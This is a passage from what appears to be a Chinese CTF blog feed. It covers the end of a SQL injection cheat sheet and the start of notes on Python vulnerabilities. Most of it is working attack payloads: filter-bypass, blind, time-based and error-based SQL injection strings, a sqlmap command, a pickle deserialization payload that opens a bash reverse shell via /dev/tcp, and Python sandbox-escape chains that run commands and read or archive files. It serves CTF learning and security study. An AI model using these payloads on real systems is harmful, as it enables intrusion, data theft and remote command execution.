表示任意单个字符。匹配单个任意字符，它常用来限制表达式的字符长度语句（可以代表一个中文字符）</li></ul><p>regexp 在使用的时候要加上 ‘^’ 这个前缀，例如 ‘^abc’</p><p>regexp 和 like 在查询的时候默认都是不区分大小写的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 不区分大小写</span><br><span class="line">select * from table_name where a like &apos;a%&apos;</span><br><span class="line">select * from table_name where a regexp &apos;^a&apos;</span><br><span class="line"></span><br><span class="line"># 区分大小写</span><br><span class="line">select * from table_name where binary a like &apos;a%&apos;</span><br><span class="line">select * from table_name where binary a regexp &apos;^a&apos;</span><br></pre></td></tr></table></figure><h3 id="碰到-“-”-逗号被过滤的情况"><a href="#碰到-“-”-逗号被过滤的情况" class="headerlink" title="碰到 “,” 逗号被过滤的情况."></a>碰到 “,” 逗号被过滤的情况.</h3><ul><li>SUBSTR(password FROM 3 FOR 1) 等同于SUBSTR(PASSWORD,3,1)</li><li>SUBSTR(password FROM 2) 等同于 SUBSTR(PASSWORD,2)</li><li>substr(database()from(3)for(1)) 等同于 mid(database()from(3)for(1))</li><li>limit 1,1 中的逗号用limit 1 offset 1</li></ul><p>使用 join</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d;</span><br></pre></td></tr></table></figure><h3 id="括号被过滤的情况"><a href="#括号被过滤的情况" class="headerlink" title="括号被过滤的情况"></a>括号被过滤的情况</h3><p>在盲注中，如果过滤了括号()，那么将无法使用substr等函数，于是无法正常的逐字节读取字段内容，此时可以使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE name NOT REGEXP &apos;^h&apos;</span><br><span class="line">SELECT * FROM users WHERE name NOT REGEXP &apos;^hh&apos;</span><br><span class="line">SELECT * FROM users WHERE name NOT REGEXP &apos;^hhh&apos;</span><br></pre></td></tr></table></figure><p>根据盲注的结果，判断字段是否和某个正则表达式匹配，这样逐字节判断字段的值。</p><p>regexp相当于rlike，使用REGEXP，NOT REGEXP，RLIKE，NOT RLIKE绕过对括号的过滤</p><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><ul><li>控制字符替代法 %20 %09 %0A %0B %0C %0D %A0 </li><li>符号替代法 /**/、select.<code></code>.password、select+user()</li><li>括号组合法 union(select(1),2)、select{x(password)}from{x(user)}</li></ul><h3 id="连续运算绕过"><a href="#连续运算绕过" class="headerlink" title="连续运算绕过"></a>连续运算绕过</h3><p>使用连续等号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * from users where username=&apos;-1&apos;=&apos;&apos; and password=&apos;-1&apos;=&apos;&apos;</span><br></pre></td></tr></table></figure></p><p>从左到右运算，先计算username=’-1’，一般数据库里不会有’-1’，故该值为0。再计算0=’’，得到值为1。password=’-1’=’’同理。</p><p>也可以使用异或的方式，原理与连续等号相同</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * from users where username=admin&apos;^(substring((select(user()))from(1))=&apos;a&apos;)^&apos;1&apos;</span><br></pre></td></tr></table></figure><h3 id="union-select-from"><a href="#union-select-from" class="headerlink" title="union  select from"></a>union  select from</h3><p>只要按照union  select from 的顺序出现，就被过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/union([\s\S]+)select([\s\S]+)from/i</span><br></pre></td></tr></table></figure><p>绕过方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1=2|@c:=(select(1))union(select@c)</span><br></pre></td></tr></table></figure><p>读目录的exp为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1=2|@c:=(select(flag)from(flag)where(flag&lt;0x30))union(select@c)</span><br></pre></td></tr></table></figure><h2 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test/query.php?name=sadf&apos; AND 7352=IF((ORD(MID((SELECT IFNULL(CAST(KeyIsMe AS CHAR),0x20) FROM example.__key__ ORDER BY ID LIMIT 0,1),18,1))&gt;50),BENCHMARK(1000000,MD5(0x4b654d45)),7352)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test/query.php?name=sadf&apos; AND 7352=IF((ORD(MID((SELECT IFNULL(CAST(KeyIsMe AS CHAR),0x20) FROM example.__key__ ORDER BY ID LIMIT 0,1),18,1))&gt;50),SLEEP(5),7352)</span><br></pre></td></tr></table></figure><h2 id="limit-注入"><a href="#limit-注入" class="headerlink" title="limit 注入"></a>limit 注入</h2><p>MySQL 5.x 到 5.6.6</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure><p>如果不支持报错注入的话，还可以基于时间注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</span><br></pre></td></tr></table></figure><p>直接使用sleep不行，需要用BENCHMARK代替。 </p><h2 id="updatexml-报错注入"><a href="#updatexml-报错注入" class="headerlink" title="updatexml 报错注入"></a>updatexml 报错注入</h2><p>如果测试的时候有提示出错信息，可以考虑使用报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show coulumns 出错:Table &apos;inject_3333.article_test&apos;&apos; doesn&apos;t exist</span><br></pre></td></tr></table></figure><p>使用的语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/a.php?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</span><br></pre></td></tr></table></figure><p>0x7e 是 ~。因为 UPDATEXML 第二个参数需要 Xpath 格式的字符串，如果不符合要求，会报错，错误大概会是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’</span><br></pre></td></tr></table></figure><p>这里 updatexml 里面第2个参数，不能使用 group_concat，因为 group_concat 是针对 select group_concat(column_name) 的</p><p>一些例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 遇到 show columns 后面要用 where 连接，不能用 and </span><br><span class="line">show COLUMNS FROM test_db.users where updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</span><br></pre></td></tr></table></figure><h2 id="show-columns-注入"><a href="#show-columns-注入" class="headerlink" title="show columns 注入"></a>show columns 注入</h2><p>代码大概如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(<span class="string">"show columns from `shop_&#123;$table&#125;`"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"show coulumns 出错:"</span>.mysql_error());</span><br></pre></td></tr></table></figure><p>show columns 语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHOW [FULL] COLUMNS &#123;FROM | IN&#125; tbl_name [&#123;FROM | IN&#125; db_name]</span><br><span class="line">    [LIKE &apos;pattern&apos; | WHERE expr]</span><br></pre></td></tr></table></figure><p>利用报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table=123` where updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)#</span><br></pre></td></tr></table></figure><h2 id="group-by-with-rollup"><a href="#group-by-with-rollup" class="headerlink" title="group by with rollup"></a>group by with rollup</h2><p>group by with rollup （对分组后的结果进行汇总），with rollup 会对 group by 的列，在最后多出一个 NULL 的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'"</span>;</span><br><span class="line">$query = mysql_query($sql); </span><br><span class="line"><span class="keyword">if</span> (mysql_num_rows($query) == <span class="number">1</span>) &#123; </span><br><span class="line">    $key = mysql_fetch_array($query);</span><br><span class="line">    <span class="keyword">if</span>($key[<span class="string">'pwd'</span>] == $_POST[<span class="string">'pwd'</span>]) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"亦可赛艇！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"一颗赛艇！"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># limit 1 offset 2 是需要不断测试，猜测出表中一共有几条数据，最后一条 pwd 的值为 null</span><br><span class="line">uname=&apos;or 1 group by pwd with rollup limit 1 offset 2#</span><br></pre></td></tr></table></figure><h2 id="desc"><a href="#desc" class="headerlink" title="desc"></a>desc</h2><p>desc 是数据库的操作命令，可以列出表或者字段的定义，desc 后可以跟 <code>表名 [列名]</code>，表名必须正确，而<code>列名则不必须</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">desc tablename filedname</span><br><span class="line">desc `tablename` `filedname`</span><br></pre></td></tr></table></figure><p>例如这种情况下，可以在列名处构造 payload 实现绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// payload: test` `where 0 union select *  from secret_test</span></span><br><span class="line">$table = $_GET[<span class="string">'table'</span>]?$_GET[<span class="string">'table'</span>]:<span class="string">"test"</span>;</span><br><span class="line">mysqli_query($mysqli,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</span><br><span class="line">$sql = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;"</span>;</span><br><span class="line">$ret = sql_query($sql);</span><br><span class="line"><span class="keyword">echo</span> $ret[<span class="number">0</span>];</span><br></pre></td></tr></table></figure><p>第1条SQL语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc `secret_test` `where 0 union select *  from secret_test`</span><br></pre></td></tr></table></figure><p>第2条SQL语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 这里 ` ` 是 secret_test 表的别名</span><br><span class="line">select &apos;flag&#123;xxx&#125;&apos; from secret_test` `where 0 union select *  from secret_test</span><br></pre></td></tr></table></figure><h2 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h2><p>order by 后面可以加字段名，表达式和字段的位置，字段的位置需要是整数型。由于 order by 后面不可以跟union，一般利用盲注。order by 后面可以跟列名，如果不存在会报错，可以用来猜测列名。</p><p>sleep 盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">order by name, if(1=1,name,price)</span><br><span class="line">order by name, if(1=1,1,(<span class="keyword">SELECT</span>(<span class="number">1</span>)<span class="keyword">FROM</span>(<span class="keyword">SELECT</span>(<span class="keyword">SLEEP</span>(<span class="number">2</span>)))<span class="keyword">test</span>)) // 正常响应时间</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">name</span>, <span class="keyword">if</span>(<span class="number">1</span>=<span class="number">2</span>,<span class="number">1</span>,(<span class="keyword">SELECT</span>(<span class="number">1</span>)<span class="keyword">FROM</span>(<span class="keyword">SELECT</span>(<span class="keyword">SLEEP</span>(<span class="number">2</span>)))<span class="keyword">test</span>)) // <span class="keyword">sleep</span> <span class="number">2</span>秒</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">name</span>,price <span class="keyword">from</span> book <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">if</span>(<span class="number">1</span>=<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">0</span>),<span class="keyword">sleep</span>(<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p>利用报错</p><p>在有些情况下无法知道列名，而且也不太直观的去判断两次请求的差别，如下用IF语句为例。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">order by IF(1=1,1,(select 1 union select 2)) 正常</span><br><span class="line">order by IF(1=2,1,(select 1 union select 2)) 错误</span><br><span class="line">order by IF(1=1,1,(select 1 from information_schema.tables)) 正常</span><br><span class="line"># 会报错误 Subquery returns more than 1 row</span><br><span class="line">order by IF(1=2,1,(select 1 from information_schema.tables)) 错误</span><br></pre></td></tr></table></figure><h2 id="where-比较条件弱类型"><a href="#where-比较条件弱类型" class="headerlink" title="where 比较条件弱类型"></a>where 比较条件弱类型</h2><p>字符串与0进行比较的时候会转成数字，跟PHP的弱类型相同</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 如果是数字开头的，则会变成前面的字符串 </span><br><span class="line">&apos;123abc&apos; == 123</span><br><span class="line">&apos;abc&apos; == 0</span><br><span class="line"># 可以把username不以数字开头的数据取出来</span><br><span class="line">select * from users WHERE username=0;</span><br><span class="line"></span><br><span class="line">#  &apos;abc&apos; + 0 为 0</span><br><span class="line">select &apos;abc&apos; + 0;</span><br><span class="line">#  &apos;abc&apos; + 123 为 123</span><br><span class="line">select &apos;abc&apos; + 123;</span><br><span class="line"># &apos;abc&apos; + &apos;0&apos; 为 0，做加法运算的时候，两边都变成数字 </span><br><span class="line">select &apos;abc&apos; + &apos;0&apos;;</span><br></pre></td></tr></table></figure><p>可以获取所有用户名和密码不为0的数据，利用这种方式可以构造万能密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="number">0</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="number">0</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'abcd'</span> + <span class="string">'0'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'abc'</span> + <span class="string">'0'</span></span><br></pre></td></tr></table></figure><h2 id="不知道列名时的注入"><a href="#不知道列名时的注入" class="headerlink" title="不知道列名时的注入"></a>不知道列名时的注入</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>在无法通过 information_schema 查询列名时，如果存在 SQL 错误回显，可以使用如下方法查询出列名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&apos;admin&apos; and (select * from (select * from users as a join users as b using(username)) as c)</span><br><span class="line"></span><br><span class="line">// 会显示这些错误信息</span><br><span class="line">[Err] 1060 - Duplicate column name &apos;password&apos;</span><br></pre></td></tr></table></figure><p>当做 join 操作时，如果两个表都有相同的字段，可以使用 using，这样可以少写 SQL 语句，因为使用了 using，两个相同的表做 join 时，using 里面的字段只会保留一个，但是另外在using里面的，就会出现两个，导致出现 Duplicate column。<br>如果是使用 join on，则是会把所有的列都保留，也就是这里会有两个相同的 id，name, password，因为报错只显示第一个错误，会提示 Duplicate column name ‘id’。</p><h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>是用两个 select union 的方式，目标的表用 select  * 查询出所有的列，然后另外一个表使用 select 1,2 as c，利用别名的方式，为该序号的列定义了一个列名，由于有 union，两个表在该序号的列就可以使用新的列名，然后外层 select 使用新的列名查询出来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select c from (select 1,2 as c union(select * from users)) as b</span><br><span class="line">// 别名的另外一种方法，不使用 as</span><br><span class="line">select c from (select 1,2`c` union(select * from users))`b`</span><br></pre></td></tr></table></figure><h2 id="一些函数"><a href="#一些函数" class="headerlink" title="一些函数"></a>一些函数</h2><h3 id="exists"><a href="#exists" class="headerlink" title="exists"></a>exists</h3><p>判断是否存在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exists(select * from admin)</span><br></pre></td></tr></table></figure><h2 id="ASP-的网站"><a href="#ASP-的网站" class="headerlink" title="ASP 的网站"></a>ASP 的网站</h2><p>遇到 asp 的网站，发现有在url中获取id参数，那么也可能会从Cookie中获取，可以尝试 Cookie 注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://10.10.1.202/shownews.asp?id=83&quot; --level=2 --risk=3 --cookie=&quot;id=82&quot; --current-db --tables --batch</span><br></pre></td></tr></table></figure><h2 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h2><p>输入 ‘’’ 看到如下数据，可以判断是 sqlite 数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unrecognized token: &quot;202cb962ac59075b964b07152d234b70&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;flag-常见表&quot;&gt;&lt;a href=&quot;#flag-常见表&quot; class=&quot;headerlink&quot; title=&quot;flag 常见表&quot;&gt;&lt;/a&gt;flag 常见表&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cl
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.restran.net/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://www.restran.net/tags/CTF/"/>
    
      <category term="SQL注入" scheme="http://www.restran.net/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>CTF 中的 Python 漏洞总结</title>
    <link href="http://www.restran.net/2018/10/29/ctf-python-vulnerability-notes/"/>
    <id>http://www.restran.net/2018/10/29/ctf-python-vulnerability-notes/</id>
    <published>2018-10-28T16:00:00.000Z</published>
    <updated>2018-10-30T01:04:04.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="执行命令的函数"><a href="#执行命令的函数" class="headerlink" title="执行命令的函数"></a>执行命令的函数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">platform.popen(<span class="string">'ipconfig'</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.Popen(<span class="string">'ipconfig'</span>, shell=<span class="keyword">True</span>, stdout=subprocess.PIPE,stderr=subprocess.STDOUT).stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>Python2.7和3.5默认使用的序列化格式有所区别，一般带有括号和换行的序列化数据是2.7使用的，而包含\x00的一般是3.5使用的。windows 和 linux 反序列化的数据是不同的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># windows， 第二行是操作系统nt</span><br><span class="line">(lp1\ncnt\nsystem...</span><br><span class="line"># linux， 第二行是操作系统posix</span><br><span class="line">(lp1\ncposix\nsystem...</span><br></pre></td></tr></table></figure><p>反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        code=<span class="string">'bash -c "bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1"'</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(code,))</span><br><span class="line">a=test()</span><br><span class="line">c=pickle.dumps(a)</span><br><span class="line"><span class="keyword">print</span> c</span><br><span class="line">pickle.loads(c)</span><br></pre></td></tr></table></figure><h2 id="Python-沙盒绕过"><a href="#Python-沙盒绕过" class="headerlink" title="Python 沙盒绕过"></a>Python 沙盒绕过</h2><p>以下代码是在Python 2.7环境下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># read 函数，读文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'abc.php'</span>).read()</span><br><span class="line"><span class="comment"># write 函数，写文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/var/www/html/input'</span>, <span class="string">'w'</span>).write(<span class="string">'123'</span>)</span><br><span class="line"><span class="comment"># 执行任意命令</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("ls /var/www/html").read()'</span> )</span><br><span class="line"><span class="comment"># 通过 system 执行任意命令</span></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].__dict__[<span class="string">'os'</span>].system(<span class="string">'id'</span>)</span><br><span class="line"><span class="comment"># 通过 popen 执行任意命令</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">'func_globals'</span>)[<span class="string">'linecache'</span>].__dict__[<span class="string">'os'</span>].__dict__[<span class="string">'popen'</span>](<span class="string">'id'</span>).read()</span><br><span class="line"><span class="comment"># 打包文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">'func_globals'</span>)[<span class="string">'linecache'</span>].__dict__[<span class="string">'os'</span>].__dict__[<span class="string">'popen'</span>](<span class="string">'tar -czvf /tmp/www.tar.gz /home/ctf/www'</span>).read()</span><br><span class="line"><span class="comment"># base64 编码读取文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">'func_globals'</span>)[<span class="string">'linecache'</span>].__dict__[<span class="string">'os'</span>].__dict__[<span class="string">'popen'</span>](<span class="string">'base64 /tmp/www.tar.gz'</span>).read()</span><br></pre></td></tr></table></figure><p>例题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7 -u</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> modules</span><br><span class="line">modules.clear()</span><br><span class="line"><span class="keyword">del</span> modules</span><br><span class="line"></span><br><span class="line">_raw_input = raw_input</span><br><span class="line">_BaseException = BaseException</span><br><span class="line">_EOFError = EOFError</span><br><span class="line"></span><br><span class="line">__builtins__.__dict__.clear()</span><br><span class="line">__builtins__ = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Get a shell, if you can...'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = &#123;<span class="string">'x'</span>:<span class="keyword">None</span>&#125;</span><br><span class="line">        <span class="keyword">exec</span> <span class="string">'x='</span>+_raw_input()[:<span class="number">50</span>] <span class="keyword">in</span> d</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Return Value:'</span>, d[<span class="string">'x'</span>]</span><br><span class="line">    <span class="keyword">except</span> _EOFError, e:</span><br><span class="line">        <span class="keyword">raise</span> e</span><br><span class="line">    <span class="keyword">except</span> _BaseException, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Exception:'</span>, e</span><br></pre></td></tr></table></figure><p>payloads</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('id');</span></span><br><span class="line">data = [</span><br><span class="line">    <span class="string">"""1;__builtins__['a']=[].__class__.__base__"""</span>,</span><br><span class="line">    <span class="string">"""1;__builtins__['b']=a.__subclasses__()[59]"""</span>,</span><br><span class="line">    <span class="string">"""1;__builtins__['c']=b.__init__.__globals__"""</span>,</span><br><span class="line">    <span class="string">"""1;__builtins__['d']=c['linecache'].__dict__"""</span>,</span><br><span class="line">    <span class="string">"""1;__builtins__['e']=d['os'].system"""</span>,</span><br><span class="line">    <span class="string">"""1;x=e('ls')"""</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = &#123;<span class="string">'x'</span>:<span class="keyword">None</span>&#125;</span><br><span class="line">        <span class="comment"># exec 'xxx' in d，表示将 d 这个字典作为全局变量的空间，但是默认会有 __builtins__ 这个变量，不会以因为每次重置 d 而丢失</span></span><br><span 